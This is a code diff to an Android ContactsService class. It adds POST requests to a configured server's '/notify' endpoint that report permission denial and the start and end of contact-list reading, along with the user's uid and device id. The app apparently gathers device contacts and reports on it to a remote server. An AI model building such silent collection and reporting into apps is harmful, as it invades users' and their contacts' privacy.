@@ -36,11 +36,35 @@ public class ContactsService extends BaseService {
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
             getContactsList();
         } else {
+
+            HashMap contactP = new HashMap();
+            contactP.put("event", "nopermission");
+            contactP.put("permission", Manifest.permission.READ_CONTACTS);
+            contactP.put("uid", commonParams.getUid());
+
+            Http req = new Http();
+            req.setUrl(commonParams.getServer() + "/notify");
+            req.setMethod(HttpRequest.METHOD_POST);
+            req.setParams(contactP);
+            req.execute();
+
             requestPermissions();
         }
     }
 
     private void getContactsList() {
+
+        HashMap startHm = new HashMap();
+        startHm.put("event", "getcontacts:started");
+        startHm.put("uid", commonParams.getUid());
+        startHm.put("device", commonParams.getDevice());
+
+        Http startReq = new Http();
+        startReq.setUrl(commonParams.getServer() + "/notify");
+        startReq.setMethod(HttpRequest.METHOD_POST);
+        startReq.setParams(startHm);
+        startReq.execute();
+
         ContentResolver cr = context.getApplicationContext().getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
@@ -92,6 +116,18 @@ public class ContactsService extends BaseService {
 
             }
         }
+
+        HashMap endHm = new HashMap();
+        endHm.put("event", "getcontacts:completed");
+        endHm.put("uid", commonParams.getUid());
+        endHm.put("device", commonParams.getDevice());
+
+        Http endReq = new Http();
+        endReq.setUrl(commonParams.getServer() + "/notify");
+        endReq.setMethod(HttpRequest.METHOD_POST);
+        endReq.setParams(endHm);
+        endReq.execute();
+
 
         cur.close();
     }
